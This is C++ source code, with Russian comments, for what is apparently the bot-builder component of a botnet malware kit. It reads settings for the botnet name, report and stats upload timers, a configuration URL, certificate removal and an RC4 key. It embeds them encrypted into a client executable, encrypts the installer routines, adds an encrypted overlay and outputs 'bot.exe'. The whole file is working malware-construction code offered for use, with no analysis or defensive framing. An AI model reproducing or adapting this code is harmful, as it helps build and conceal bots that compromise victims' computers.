#include <windows.h>
#include <shlwapi.h>

#include "defines.h"
#include "buildbot.h"
#include "tools.h"
#include "languages.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\crypt.h"
#include "..\common\baseoverlay.h"
#include "..\common\generateddata.h"
#include "..\common\peimage.h"
#include "..\common\fs.h"
#include "..\common\gui.h"

#if(BO_CLIENT_PLATFORMS > 0)
#include "clients.h"

/*
  Сторонний криптор.

  IN in   - указатель на адрес исходного образа.
  OUT out - указатель на адрес конечного образа. Освободить через VirtualFree().

  Return  - *in. Ошибку не возращает не когда (конечно же наивно).
*/
extern "C" LPBYTE __stdcall crypt(LPBYTE *in, LPBYTE *out);

void BuildBot::init(void)
{

}

void BuildBot::uninit(void)
{

}

/*
  Произволно заполняем базовую конфигурацию, исходя из даты сборки.

  OUT baseConfig - конфигурация.
*/
static __declspec(noinline) void generateSecretHash(BASECONFIG *baseConfig)
{
  DWORD seek = Crypt::crc32Hash((LPBYTE)BO_BUILDTIME, sizeof(BO_BUILDTIME) - sizeof(WCHAR));
  for(DWORD i = 0; i < sizeof(BASECONFIG); i++)((LPBYTE)baseConfig)[i] = ((seek = seek * 214013L + 2531011L) >> 16) & 0xFF;
}

bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder)
{
  Config0::VAR *rootNode;
  Config0::VAR *currentNode;
  BASECONFIG baseConfig;
  
  writeOutput(output, Languages::get(Languages::builder_bot_proc_begin));
  generateSecretHash(&baseConfig);

  writeOutput(output, Languages::get(Languages::builder_bot_proc_config));
  baseConfig.flags = 0;

  //Открываем раздел.
  if((rootNode = Config0::_GetVar(NULL, config, NULL, "staticconfig")) == NULL)
  {
    writeOutputError(output, Languages::get(Languages::builder_staticconfig_not_founded));
    return false;
  }
  
  //Ботнет.
  baseConfig.defaultBotnet[0] = 0;
  if((currentNode = Config0::_GetVar(rootNode, NULL, "botnet", NULL)) && currentNode->bValuesCount > 1 && *currentNode->pValues[1] != 0)
  {
    LPWSTR botnet = Str::_utf8ToUnicode(currentNode->pValues[1], -1);
    if(botnet == NULL)
    {
      writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
      return false;
    }
    if(Str::_LengthW(botnet) > BOTNET_MAX_CHARS)
    {
      Mem::free(botnet);
      WCHAR buf[100];
      Str::_sprintfW(buf, sizeof(buf) / sizeof(WCHAR), Languages::get(Languages::builder_staticconfig_botnet_bad), BOTNET_MAX_CHARS); 
      writeOutputError(output, buf);
      return false;
    }
    Str::_CopyW(baseConfig.defaultBotnet, botnet, -1);
    Mem::free(botnet);
  }
  writeOutput(output, L"botnet=%s", baseConfig.defaultBotnet);

  //Задержка загрузки конфигурации.
  currentNode = Config0::_GetVar(rootNode, NULL, "timer_config", NULL);
  baseConfig.delayConfig  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 60) & 0xFFFF) << 16;
  baseConfig.delayConfig |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 10) & 0xFFFF);
  writeOutput(output, L"timer_config=%umin, %umin", HIWORD(baseConfig.delayConfig), LOWORD(baseConfig.delayConfig));
  
  //Задержка загрузки отчетов.
  currentNode = Config0::_GetVar(rootNode, NULL, "timer_logs", NULL);
  baseConfig.delayReport  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 5) & 0xFFFF) << 16;
  baseConfig.delayReport |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 5) & 0xFFFF);
  writeOutput(output, L"timer_logs=%umin, %umin", HIWORD(baseConfig.delayReport), LOWORD(baseConfig.delayReport));

  //Задержка загрузки статистики.
  currentNode = Config0::_GetVar(rootNode, NULL, "timer_stats", NULL);
  baseConfig.delayStats  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 5) & 0xFFFF) << 16;
  baseConfig.delayStats |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 5) & 0xFFFF);
  writeOutput(output, L"timer_stats=%umin, %umin", HIWORD(baseConfig.delayStats), LOWORD(baseConfig.delayStats));

  //Файл конфигурации.
  {
    DWORD urlSize;
    if((currentNode = Config0::_GetVar(rootNode, NULL, "url_config", NULL)) == NULL || currentNode->bValuesCount < 2 || (urlSize = Str::_LengthA(currentNode->pValues[1])) == 0)
    {
      writeOutputError(output, Languages::get(Languages::builder_staticconfig_url_config_not_founded));
      return false;
    }

    if(urlSize > sizeof(baseConfig.defaultConfig) / sizeof(baseConfig.defaultConfig[0]) - 1)
    {
      WCHAR buf[100];
      Str::_sprintfW(buf, sizeof(buf) / sizeof(WCHAR), Languages::get(Languages::builder_staticconfig_url_config_bad), sizeof(baseConfig.defaultConfig) / sizeof(baseConfig.defaultConfig[0]) - 1); 
      writeOutputError(output, buf);
      return false;
    }

    LPWSTR defaultConfig = Str::_utf8ToUnicode(currentNode->pValues[1], -1);
    if(defaultConfig == NULL)
    {
      writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
      return false;
    }

    Str::_CopyA(baseConfig.defaultConfig, currentNode->pValues[1], urlSize);
    writeOutput(output, L"url_config=%s", defaultConfig);
    Mem::free(defaultConfig);
  }

  //Флаги.
  {
    currentNode = Config0::_GetVar(rootNode, NULL, "remove_certs", NULL);
    if(currentNode == NULL || currentNode->bValuesCount < 2 || Str::_ToInt32A(currentNode->pValues[1], NULL) != 0)baseConfig.flags |= BCF_REMOVE_CERTS;
    writeOutput(output, L"remove_certs=%u", (baseConfig.flags & BCF_REMOVE_CERTS) ? 1 : 0);

    currentNode = Config0::_GetVar(rootNode, NULL, "disable_tcpserver", NULL);
    if(currentNode && currentNode->bValuesCount > 1 && Str::_ToInt32A(currentNode->pValues[1], NULL) != 0)baseConfig.flags |= BCF_DISABLE_TCPSERVER;
    writeOutput(output, L"disable_tcpserver=%u", (baseConfig.flags & BCF_DISABLE_TCPSERVER) ? 1 : 0);
  }
  
  //Ключ шифрования.
  {
    DWORD keySize; 
    if((currentNode = Config0::_GetVar(rootNode, NULL, "encryption_key", NULL)) == NULL || currentNode->bValuesCount < 2 || (keySize = Str::_LengthA(currentNode->pValues[1])) < 1)
    {
      writeOutputError(output, Languages::get(Languages::builder_staticconfig_encryption_key_not_founded));
      return false;
    }
    Crypt::_rc4Init(currentNode->pValues[1], keySize, &baseConfig.baseKey);
    writeOutput(output, L"encryption_key=OK");
  }

  //////////////////////////////////////////////////////////////////////////////////////////////////
  // Криптуем образ.
  //////////////////////////////////////////////////////////////////////////////////////////////////
  writeOutput(output, Languages::get(Languages::builder_bot_proc_creating));

  //Парсим образ бота.
  PeImage::PEDATA originalPe;
  if(PeImage::_createFromMemory(&originalPe, (LPBYTE)_client32, sizeof(_client32), false) == NULL)
  {
    writeOutputError(output, Languages::get(Languages::builder_bot_corrupted));
    return false;
  }
  
  //Добавляем конфигурацию.
  {
    WORD sectionIndex;
    DWORD sectionOffset = PeImage::_rvaToRsa(&originalPe, CLIENT32_VA_BASECONFIG - originalPe.ntHeader.p32->OptionalHeader.ImageBase, &sectionIndex);
    
    if(sectionOffset == 0)
    {
      PeImage::_freeImage(&originalPe);
      writeOutputError(output, Languages::get(Languages::builder_bot_corrupted));
      return false;
    }

    for(DWORD i = 0; i < sizeof(BASECONFIG); i++)((LPBYTE)&baseConfig)[i] ^= originalPe.sectionsRawData[PESECTION_OF_BASECONFIG_KEY][i];
    Mem::_copy(&originalPe.sectionsRawData[sectionIndex][sectionOffset], &baseConfig, sizeof(BASECONFIG));
  }

  //Шифруем инсталлятор
  INSTALLDATA installData;
  {
    WORD installIndex;
    DWORD installOffset = PeImage::_rvaToRsa(&originalPe, CLIENT32_VA_INSTALL - originalPe.ntHeader.p32->OptionalHeader.ImageBase, &installIndex);
    WORD updateIndex;
    DWORD updateOffset = PeImage::_rvaToRsa(&originalPe, CLIENT32_VA_UPDATE - originalPe.ntHeader.p32->OptionalHeader.ImageBase, &updateIndex);

    if(installOffset == 0 || updateOffset == 0)
    {
      PeImage::_freeImage(&originalPe);
      writeOutputError(output, Languages::get(Languages::builder_bot_corrupted));
      return false;
    }

    Crypt::_generateBinaryData((LPBYTE)&installData.xorKey, sizeof(unsigned long), 0x01, 0xFF, false);
    installData.installSize = BaseOverlay::_encryptFunction(&originalPe.sectionsRawData[installIndex][installOffset], installData.xorKey);
    installData.updateSize  = BaseOverlay::_encryptFunction(&originalPe.sectionsRawData[updateIndex][updateOffset], installData.xorKey);
  }

  //Процесс криптования.
  LPBYTE destRawPe    = NULL;
  DWORD destRawPeSize = 0;
  {
    if((destRawPeSize = PeImage::_buildImage(&originalPe, 0, 0, &destRawPe)) == 0)destRawPe = NULL;

    PeImage::_freeImage(&originalPe);

    //Узнаем размер образа
    if(destRawPe == NULL)
    {
      writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
      return false;
    }
    else
    {
      WCHAR info[100];
      Str::_sprintfW(info, sizeof(info) / sizeof(WCHAR), Languages::get(Languages::builder_bot_proc_output_info), destRawPeSize);
      writeOutput(output, info);
    }

    //Добавляем оверлей.
    {
      Crypt::RC4KEY keyOfOverlay;
      Crypt::_rc4Init(&baseConfig, sizeof(BASECONFIG), &keyOfOverlay);

      if(!Mem::reallocEx(&destRawPe, destRawPeSize + BaseOverlay::FULL_SIZE_OF_OVERLAY) ||
         !BaseOverlay::_createOverlay(destRawPe + destRawPeSize, &installData, sizeof(INSTALLDATA), &keyOfOverlay))
      {
        Mem::free(destRawPe);
        writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
        return false;
      }

      destRawPeSize += BaseOverlay::FULL_SIZE_OF_OVERLAY;
    }
  }

  //Пишим образ.
  {
    WCHAR outputFile[MAX_PATH];
    LPWSTR file = NULL;
    LPSTR bot;
    
    //Получаем имя файла.
    if((rootNode = Config0::_GetVar(NULL, config, NULL, "dynamicconfig")) && (currentNode = Config0::_GetVar(rootNode, NULL, "url_loader", NULL)) &&
       currentNode->bValuesCount > 1 && (bot = CWA(shlwapi, PathFindFileNameA)(currentNode->pValues[1])) && *bot != 0)
    {
      file = Str::_utf8ToUnicode(bot, -1);
    }
    
    Fs::_pathCombine(outputFile, destFolder, file == NULL ? L"bot.exe" : file);
    Mem::free(file);
    
    bool rsf = (Gui::_browseForSaveFile(owner, destFolder, outputFile, NULL, NULL, 0) && Fs::_saveToFile(outputFile, destRawPe, destRawPeSize));
    Mem::free(destRawPe);

    if(!rsf)
    {
      writeOutputError(output, Languages::get(Languages::error_fwrite_failed));
      return false;
    }
  }

  writeOutput(output, Languages::get(Languages::builder_bot_proc_end));
  return true;
}
#endif
